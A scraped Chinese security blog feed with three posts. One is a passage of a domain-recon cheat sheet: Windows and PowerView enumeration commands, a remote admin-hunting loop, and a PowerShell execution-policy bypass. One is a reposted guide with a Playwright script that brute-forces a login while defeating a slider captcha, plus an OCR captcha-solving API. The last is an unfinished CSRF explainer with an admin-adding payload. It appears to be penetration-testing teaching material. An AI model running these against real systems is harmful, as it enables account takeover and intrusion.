<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419230151231.png" alt="image-20210419230151231"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdom query pdc</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419230223214.png" alt="image-20210419230223214"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -type=SRV _LDAP._tcp</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419230340481.png" alt="image-20210419230340481"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure>

<h4 id="5-获取域内用户和管理员"><a href="#5-获取域内用户和管理员" class="headerlink" title="5. 获取域内用户和管理员"></a>5. 获取域内用户和管理员</h4><p>&#x3D;&#x3D;查询所有域用户列表&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br><span class="line">wmic useraccount get /all</span><br><span class="line">dsquery user                                 #外部程序</span><br><span class="line">net localgroup administrators /domain</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419230825439.png" alt="image-20210419230825439"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419230936934.png" alt="image-20210419230936934"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419230948966.png" alt="image-20210419230948966"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419230956887.png" alt="image-20210419230956887"></p>
<p>&#x3D;&#x3D;查询域管理员用户组&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br><span class="line">net group &quot;Enterprise Admains&quot; /domain</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419231221049.png" alt="image-20210419231221049"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419231302207.png" alt="image-20210419231302207"></p>
<h4 id="6-定位域管理员"><a href="#6-定位域管理员" class="headerlink" title="6. 定位域管理员"></a>6. 定位域管理员</h4><p>利用工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsLoggedon.exe</span><br><span class="line">NetSess.exe           //查看主机当前会话</span><br><span class="line">PVEFindADUser.exe  -current</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419231504432.png" alt="image-20210419231504432"></p>
<h4 id="7-查找域管理进程"><a href="#7-查找域管理进程" class="headerlink" title="7. 查找域管理进程"></a>7. 查找域管理进程</h4><p>&#x3D;&#x3D;1、本机检查&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot;  /domain     //获取域管理员列表</span><br><span class="line">tasklist /v                            //列出本机所有进程及进程用户</span><br></pre></td></tr></table></figure>

<p>​						   然后寻找是否有进程所有者为域管理员的进程</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419231810115.png" alt="image-20210419231810115"></p>
<p>&#x3D;&#x3D;2、查询域控制器的域用户会话&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot;  /domain     //收集域控制器的列表</span><br><span class="line">net group &quot;Domain Admins&quot;       /domain     //收集域管理员列表</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419232021031.png" alt="image-20210419232021031"></p>
<p>使用<strong>Netsess.exe</strong>查询每个域控制器，收集所有活动域会话的列表，将域管理员列表与活动会话列表交叉引用，以确定哪些IP地址具有活动域令牌</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Netsess.exe  -h</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419232214710.png" alt="image-20210419232214710"></p>
<p>&#x3D;&#x3D;3、扫描远程系统上运行的任务&#x3D;&#x3D;</p>
<p>​								<code>前提是目标使用了本地域管理员共享账户</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process  on %i &amp;&amp; pause</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;4、扫描远程系统上NetBIOS信息&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure>

<h4 id="8-利用PowerShell收集域内信息"><a href="#8-利用PowerShell收集域内信息" class="headerlink" title="8. 利用PowerShell收集域内信息"></a>8. 利用PowerShell收集域内信息</h4><p>PowerShell 常用的执行权限共有四种。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> Restricted：默认设置，不允许执行任何脚本。</span><br><span class="line"> Allsigned：只能运行经过证书验证的脚本。</span><br><span class="line"> Unrestricted：权限最高，可以执行任意脚本。</span><br><span class="line"> RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。</span><br></pre></td></tr></table></figure>

<p>在 PowerShell 中输入“<strong>Get-ExecutionPolicy</strong>”，看到为默认 Restricted权限，</p>
<p>如果想执行一个 PowerShell 脚本，需要修改 PowerShell 的默认权限为执行权限。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-Executionpolicy</span> Unrestricted</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419233148972.png" alt="image-20210419233148972"></p>
<p>PowerView 集成在 PowerSploit 工具包中，下载地址为</p>
<p><strong><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</a></strong></p>
<pre><code>                                 PowerView 中的常用命令
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-NetDomain           	  // 获取当前用户所在的域名称。</span><br><span class="line">Get-NetUser   				 // 返回所有用户的详细信息。</span><br><span class="line">Get-NetDomainController    	// 获取所有域控制器。</span><br><span class="line">Get-NetComputer   			 // 获取所有域内机器的详细信息。</span><br><span class="line">Get-NetOU    				// 获取域中的 OU 信息。</span><br><span class="line">Get-NetGroup   				 // 获取所有域内组和组成员信息。</span><br><span class="line">Get-NetFileServer   	 // 根据 SPN 获取当前域使用的文件服务器。</span><br><span class="line">Get-NetShare   			 // 获取当前域内所有网络共享。</span><br><span class="line">Get-NetSession   		 // 获取在指定服务器存在的会话信息。</span><br><span class="line">Get-NetRDPSession 		   // 获取在指定服务器存在的远程连接信息。</span><br><span class="line">Get-NetProcess    		// 获取远程主机的进程信息。</span><br><span class="line">Get-UserEvent   			 // 获取指定用户的日志信息。</span><br><span class="line">Get-ADObject    			// 获取活动目录的对象信息。</span><br><span class="line">Get-NetGPO   				 // 获取域所有组策略对象。</span><br><span class="line">Get-DomainPolicy 		   // 获取域默认或域控制器策略。</span><br><span class="line">Invoke-UserHunter    		// 用于获取域用户登录计算机及该用户是否有本地管理权限。</span><br><span class="line">Invoke-ProcessHunter    	// 查找域内所有机器进程用于找到某特定用户。</span><br><span class="line">Invoke-UserEventHunter    // 根据用户日志获取某域用户</span><br></pre></td></tr></table></figure>

<p><strong>如果在实战中目标powershell的权限是不允许执行任意脚本，那么可以用 -exec bypass  来进行绕过</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-exec</span> bypass <span class="string">&quot;import-module c:\powerview.ps1;get-netuser&quot;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>RedTeam</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>基于浏览器的口令暴破与图形验证码识别</title>
    <url>/posts/80695199.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/eV0UzlJxKuxkVeWnfvGvUQ">https://mp.weixin.qq.com/s/eV0UzlJxKuxkVeWnfvGvUQ</a></p>
</blockquote>
<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>随着网络安全水平的发展，越来越多的网站增加了RSA加密、图形验证码等防护手段，传统的口令暴破方式已捉襟见肘，如果高效、低代码的进行口令暴破？本文将介绍一个操作浏览器进行口令暴破的案例与验证码识别工具。</p>
<blockquote>
<p>转载者注释：</p>
<p>不建议使用第一种 playwright ，差了点意思，需要 node 环境，还要下载几个包，尝试了一个拖动滑块网站没有成功，尝试了超星，发现超星还在用flash，直接寄。</p>
<p>ddddocr 感觉挺好的，可以和 burpsuite 联动。</p>
<p>但是 captcha-killer 不适合和最新版 burpsuite，只适合 burp1.7版。</p>
<p>所以这篇文章是我在试用之后才发现不适合的，但思路可以借鉴，所以找到了另一个项目，推荐：</p>
<p> <a href="https://github.com/f0ng/captcha-killer-modified">https://github.com/f0ng/captcha-killer-modified</a></p>
</blockquote>
<h2 id="0x02-Playwright：浏览器自动化工具"><a href="#0x02-Playwright：浏览器自动化工具" class="headerlink" title="0x02 Playwright：浏览器自动化工具"></a>0x02 Playwright：浏览器自动化工具</h2><p>Playwright是一个强大的Python库，仅用一个API即可自动执行Chromium、Firefox、WebKit等主流浏览器自动化操作，并同时支持以无头模式、有头模式运行。相比传统的“selenium”等工具，他可以录制我们对浏览器的操作并自动生成脚本，同时代码也是非常简单，与我们高效工作的目标非常契合。</p>
<h2 id="0x03-Playwright：滑动验证码案例"><a href="#0x03-Playwright：滑动验证码案例" class="headerlink" title="0x03 Playwright：滑动验证码案例"></a>0x03 Playwright：滑动验证码案例</h2><h3 id="生成登录流程代码"><a href="#生成登录流程代码" class="headerlink" title="生成登录流程代码"></a>生成登录流程代码</h3><p>安装playwright后，运行下面命令进行录制浏览器操作，并生成代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m playwright codegen</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4%E6%9A%B4%E7%A0%B4%E4%B8%8E%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/640.jpeg" alt="图片"></p>
<p>输入目标URL并回车，可以看到自动生成了代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4%E6%9A%B4%E7%A0%B4%E4%B8%8E%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/640-16529396925591.jpeg" alt="图片"></p>
<p>输入账号、密码，点击验证码，然后点击登录。录制过程中并不能拖动滑块，所以无法生成滑块的代码，登录操作其余的大部分代码均已生成，也可以看到其代码是非常简单的：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4%E6%9A%B4%E7%A0%B4%E4%B8%8E%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/640-16529396925602.jpeg" alt="图片"></p>
<h3 id="修改为暴破脚本"><a href="#修改为暴破脚本" class="headerlink" title="修改为暴破脚本"></a>修改为暴破脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from playwright.sync_api import Playwright, sync_playwright</span><br><span class="line"># chrome的路径</span><br><span class="line">chromepath = r&quot;chromium-939194\chrome-win\chrome.exe&quot;</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def readpasswd(filename):</span><br><span class="line">fp = open(r&quot;password.txt&quot;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;)</span><br><span class="line">return fp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run(playwright: Playwright) -&gt; None:</span><br><span class="line">browser = playwright.chromium.launch(executable_path=chromepath, headless=False)</span><br><span class="line">context = browser.new_context()</span><br><span class="line"></span><br><span class="line"># Open new page</span><br><span class="line">page = context.new_page()</span><br><span class="line">fp = readpasswd(1)</span><br><span class="line">username = &#x27;admin&#x27;</span><br><span class="line"># 循环读取字典暴破</span><br><span class="line">for passwd in fp:</span><br><span class="line">page.goto(&quot;http://xxx.xxx.xxx.xxx/login.html&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Click input[name=&quot;userName&quot;]</span><br><span class="line">page.click(&quot;input[name=\&quot;userName\&quot;]&quot;)</span><br><span class="line"></span><br><span class="line"># Fill input[name=&quot;userName&quot;]</span><br><span class="line">page.fill(&quot;input[name=\&quot;userName\&quot;]&quot;, username)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Click input[name=&quot;password&quot;]</span><br><span class="line">page.click(&quot;input[name=\&quot;password\&quot;]&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Fill input[name=&quot;password&quot;]</span><br><span class="line">page.fill(&quot;input[name=\&quot;password\&quot;]&quot;, passwd)</span><br><span class="line"></span><br><span class="line"># Click text=/.*\&gt;\&gt;.*/</span><br><span class="line"># 滑动解锁代码</span><br><span class="line">s = page.wait_for_selector(&quot;text=/.*\\&gt;\\&gt;.*/&quot;)</span><br><span class="line">box = s.bounding_box()</span><br><span class="line">page.mouse.move(box[&quot;x&quot;] + box[&quot;width&quot;] / 2, box[&quot;y&quot;] + box[&quot;height&quot;] / 2)</span><br><span class="line">page.mouse.down()</span><br><span class="line"></span><br><span class="line"># for i in range(10):</span><br><span class="line">page.mouse.move(box[&quot;x&quot;]+520,box[&quot;width&quot;]/2, steps=10)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Click text=登录</span><br><span class="line">page.mouse.up()</span><br><span class="line">page.click(&quot;text=登录&quot;)</span><br><span class="line">sleep(1)</span><br><span class="line">response_html = page.content()</span><br><span class="line">print(f&#x27;username: &#123;username&#125;, password: &#123;passwd&#125;, length: &#123;len(response_html)&#125;, title: &#123;page.title()&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------</span><br><span class="line">context.close()</span><br><span class="line">browser.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with sync_playwright() as playwright:</span><br><span class="line">run(playwright)</span><br></pre></td></tr></table></figure>

<p>运行效果如下，通过页面长度、标题等输出信息可大致判断是否暴破成功：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4%E6%9A%B4%E7%A0%B4%E4%B8%8E%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/640-16529396925603.jpeg" alt="图片"></p>
<h2 id="0x04-ddddocr：Python验证码识别库"><a href="#0x04-ddddocr：Python验证码识别库" class="headerlink" title="0x04 ddddocr：Python验证码识别库"></a>0x04 ddddocr：Python验证码识别库</h2><p>ddddocr是Python的一个OCR通用验证码识别SDK，可离线识别验证码。项目地址：<a href="https://github.com/sml2h3/ddddocr%E3%80%82">https://github.com/sml2h3/ddddocr。</a></p>
<p>为了方便使用这个验证码识别工具，我写了个简单的web api来方便远程调用验证码识别服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### 保存以下代码为py文件，在服务器或者本地运行（需安装好ddddocr库）。</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request, abort</span><br><span class="line">import base64</span><br><span class="line">import traceback</span><br><span class="line">import sys</span><br><span class="line">from os.path import join, abspath, dirname</span><br><span class="line">import ddddocr</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">token = &#x27;fbc3a282fd5ed254e54d2260607a1360&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    if  request.method == &#x27;POST&#x27;:</span><br><span class="line">        usertoken = request.form.get(&#x27;token&#x27;)</span><br><span class="line">        img = request.form.get(&#x27;b64img&#x27;)</span><br><span class="line">    if token != usertoken:</span><br><span class="line">        return &#x27;token error!&#x27;, 403</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            content = base64.b64decode(img.encode(&#x27;utf-8&#x27;))</span><br><span class="line">            res = classfifyCode(content)</span><br><span class="line">        except:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            res = &#x27;&#x27;</span><br><span class="line">    return res, 200</span><br><span class="line">def classfifyCode(image):</span><br><span class="line">    ocr = ddddocr.DdddOcr()</span><br><span class="line">    res = ocr.classification(image)</span><br><span class="line">    return res</span><br><span class="line">def main():</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=50001, debug=True)</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>调用示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"># 获取验证码图片</span><br><span class="line">r = requests.get(&#x27;https://i.nosec.org/rucaptcha/&#x27;)</span><br><span class="line">img = r.content</span><br><span class="line">b64img = base64.b64encode(img).decode(&#x27;utf-8&#x27;)</span><br><span class="line">token = &#x27;fbc3a282fd5ed254e54d2260607a1360&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">&#x27;token&#x27;: token,</span><br><span class="line">&#x27;b64img&#x27;: b64img</span><br><span class="line">&#125;</span><br><span class="line">proxy = &#123;</span><br><span class="line">    &#x27;http&#x27;:&#x27;127.0.0.1:8081&#x27;</span><br><span class="line">&#125;</span><br><span class="line"># 验证码识别服务器url</span><br><span class="line">r2 = requests.post(&#x27;http://127.0.0.1:50001&#x27;, data=data, proxies=proxy)</span><br><span class="line">print(r2.text, r.status_code)</span><br></pre></td></tr></table></figure>

<p>这里随便找了个图形验证码测试，能正常检测出来，而且速度非常快：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4%E6%9A%B4%E7%A0%B4%E4%B8%8E%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/640-16529396925614.jpeg" alt="图片"></p>
<p>既然验证码识别的问题解决了，后面就是根据我们的实际需要去编写脚本或者集成到已有工具中了，非常简单。</p>
<p>下面补充一个burpsuite验证码识别插件“captcha-killer”调用该接口的案例：</p>
<p>captcha-killer-modified：<a href="https://github.com/f0ng/captcha-killer-modified">https://github.com/f0ng/captcha-killer-modified</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:50001</span><br><span class="line">User-Agent: python-requests/2.27.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 23628</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">token=fbc3a282fd5ed254e54d2260607a1360&amp;b64img=&lt;@URLENCODE&gt;&lt;@BASE64&gt;&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;&lt;/@BASE64&gt;&lt;/@URLENCODE&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4%E6%9A%B4%E7%A0%B4%E4%B8%8E%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/640-16529396925615.jpeg" alt="图片"></p>
<h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>本文介绍了浏览器自动化工具Playwright、验证码识别库ddddocr以及滑动验证码的暴破案例，如果遇到图形验证码的站点，只需要把滑动验证码的代码修改为调用ddddocr接口即可，相信聪明的读者们一定可以做到，就不重复赘述。</p>
<p>最后，感谢以下开源项目：</p>
<p><a href="https://github.com/microsoft/playwright-python">https://github.com/microsoft/playwright-python</a></p>
<p><a href="https://github.com/sml2h3/ddddocr">https://github.com/sml2h3/ddddocr</a></p>
<p><a href="https://github.com/f0ng/captcha-killer-modified">https://github.com/f0ng/captcha-killer-modified</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>验证码</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF 漏洞</title>
    <url>/posts/9084aa45.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/IR-GPGVcaKKm5XXslr0NgA">https://mp.weixin.qq.com/s/IR-GPGVcaKKm5XXslr0NgA</a></p>
</blockquote>
<p><strong>CSRF漏洞是什么:</strong></p>
<p>目标用户使用其用户名和密码登录受信任站点，从而创建了一个新的会话，受信任站点则会为目标用户Web浏览器Cookie中的会话信息存储了会话标示符。测试者往Web应用页面中插入恶意的HTML链接或脚本代码，而目标页面又没有过滤或者过滤不严，那么当用户浏览该页面时，用户的Web浏览器将被操纵向受信任站点发送一个恶意请求，比如删除帖子、添加管理员、添加邮件转发规则、改变路由器的DNS设置等。Web浏览器将会为这个恶意请求自动附加会话Cookie信息，因为是访问的受信任站点，因此该恶意请求将会成功完成。</p>
<p><strong>CSRF漏洞原理:</strong></p>
<p>网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态,假如某网站对用户的一些操作(比如删除帖子,添加管理员等)没有做除了cookie之外的其它验证,那么在此期间,攻击者发送了构造好的csrf脚本或包含csrf脚本的链接,诱使用户去点击可能会执行一些用户不想做的功能.</p>
<p><strong>CSRF漏洞原理图:</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E4%B9%8BCSRF/640.png" alt="图片"></p>
<p><strong>与XSS相比</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XSS：利用用户对站点的信任，攻击者通过注入程序来修改网站来使用户浏览器被重定向等</span><br><span class="line">CSRF：利用站点对已经身份认证的用户的信任，攻击者伪造一个链接误导用户点击链接来使用用户的身份认证来访问服务器</span><br></pre></td></tr></table></figure>

<p><strong>利用CSRF漏洞的前提条件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 受害者登录受信任网站A，并在本地生成Cookie</span><br><span class="line">(2) 受害者在不登出网站A的情况下访问恶意网站B</span><br><span class="line">(3) 猜到所有表单或者URL参数中的值</span><br></pre></td></tr></table></figure>

<p><strong>CSRF漏洞的分类</strong></p>
<ul>
<li><strong>GET型的CSRF:</strong></li>
</ul>
<p>假如有这样一个场景,用户登陆后添加管理员账户,正常请求为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.***.com/useradd.php?user=test&amp;pwd=123.com</span><br></pre></td></tr></table></figure>

<p>但是因为服务端没有做除了cookie之外的校验,那么攻击者可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://www.***.com/useradd.php?user=hacker&amp;pwd=123.com&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>包含该代码代码的一个页面,诱使受害者去点击,当受害者点击之后就会在受害者不知情的情况下添加一个账号为hacker,密码为123.com的管理员账户</p>
<p><strong>小技巧:如果请求url太长,可以制作成短链接</strong></p>
<ul>
<li><strong>POST型的CSRF:</strong></li>
</ul>
<p>假设有这样一个场景,用户A给用户B去转账,正常请求为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /give_money.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.123</span><br><span class="line"></span><br><span class="line">user=zhangsan&amp;money=100</span><br></pre></td></tr></table></figure>

<p>所做的操作为用户A给张三转账100元,攻击者可以构造一个自动提交的form表单</p>
